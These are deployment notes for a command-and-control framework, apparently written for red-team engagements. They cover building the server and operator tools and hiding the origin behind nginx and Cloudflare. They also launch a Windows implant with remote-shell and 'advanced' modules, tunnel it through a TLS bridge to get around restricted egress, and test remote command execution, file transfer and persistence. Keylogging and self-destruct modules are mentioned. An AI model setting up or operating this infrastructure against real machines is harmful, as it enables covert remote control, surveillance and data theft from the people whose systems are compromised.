# Deployment Notes

The examples below use documentation-only hostnames and addresses. Replace them with your own infrastructure and never commit real keys.

## 1. Server

```bash
cd server
go build -o /opt/c2/bin/server ./cmd/server
go build -o /opt/c2/bin/operator ./cmd/operator
```

Copy `deploy/config.server.example.json` to `/opt/c2/config.json` and set:

- `client_psk` and `operators[].psk` to 32 random bytes encoded as `base64:...`
- `client_listen` (default `127.0.0.1:9909`)
- `operator_listen` (default `127.0.0.1:9910`)
- `files_dir` and `audit_log`
- `allow_shell` / `allow_advanced` only for engagements that require them

Run it under systemd (see `deploy/systemd/backd-c2-server.service`). Keep both listeners bound to loopback; expose them only through nginx.

## 2. nginx / Cloudflare

`deploy/nginx/backd-c2.conf` shows two HTTPS vhosts:

- `c2-client.example.com` → `127.0.0.1:9909`
- `c2-operator.example.com` → `127.0.0.1:9910`

Use WebSocket upgrade headers and long read timeouts. If Cloudflare proxies the records, restrict the origin to Cloudflare ranges and consider a Cloudflare Tunnel instead of exposing the origin.

The operator endpoint should be restricted to known source addresses:

```nginx
allow 203.0.113.10;
deny all;
```

## 3. Operator

```bat
set C2_OPERATOR_ADDR=wss://c2-operator.example.com/ws
set C2_OPERATOR_SNI=c2-operator.example.com
set C2_OPERATOR_FAMILY=auto
set C2_OPERATOR_USER=ops
set C2_OPERATOR_PSK=base64:...
operator.exe list
```

Optional:

- `C2_OPERATOR_TLS_CA` — CA bundle or chain for the operator endpoint.
- `C2_OPERATOR_TLS_PIN` — leaf-certificate SHA-256 pin.
- `C2_OPERATOR_FAMILY=6` — use IPv6 if IPv4 to the edge is filtered.
- `C2_OPERATOR_DIAL_IP` — connect to a specific address while keeping SNI/Host.

## 4. Windows client

Build with `client/build.cmd` and pass the host/port/path/ID/PSK as environment variables. The client can also read `C2_CLIENT_PSK`, `C2_CLIENT_HOST`, `C2_CLIENT_PORT`, and `C2_CLIENT_PATH` at run time.

Example launch:

```bat
set C2_CLIENT_ID=client-01
set C2_CLIENT_PSK=base64:...
set C2_CLIENT_HOST=127.0.0.1
set C2_CLIENT_PORT=9909
set C2_CLIENT_PATH=/ws
backd-client.exe --allow-shell --allow-adv -v --log C:\Windows\Temp\client.log
```

Do not put the PSK on the command line; use an environment variable or a protected file.

## 5. TLS bridge (restricted egress)

Some legacy hosts cannot resolve or directly reach the public front. Run the bridge locally and point the client at the loopback listener:

```bat
tlsbridge.exe --listen 127.0.0.1:1443 --connect 203.0.113.10:443 --sni c2-client.example.com
```

Then build/run the client with `C2_CLIENT_HOST=127.0.0.1` and `C2_CLIENT_PORT=1443`. The bridge forwards the WebSocket to the origin over TLS. The client still sends its `Host` header from its configured host; if you need a different Host, use a local hosts entry or a bridge that rewrites the header.

## 6. TUI

```bash
cd tui
go build -o c2tui.exe .
c2tui.exe
```

Set the same `C2_OPERATOR_*` environment variables as the CLI, or use the TUI's config file (see `tui/README.md`). Keep config files out of Git.

## 7. Verification

- `operator.exe list` should show the client id.
- `operator.exe task <sid> sysinfo` should return a JSON map.
- `operator.exe shell <sid> "whoami"` should return the expected identity.
- `operator.exe push` then `pull` a small file and compare SHA-256.
- Kill the client and confirm the connector reconnects according to your deployment's watchdog/persistence policy.

Do not enable persistence, key logging, or self-destruct modules in a production environment without explicit approval.
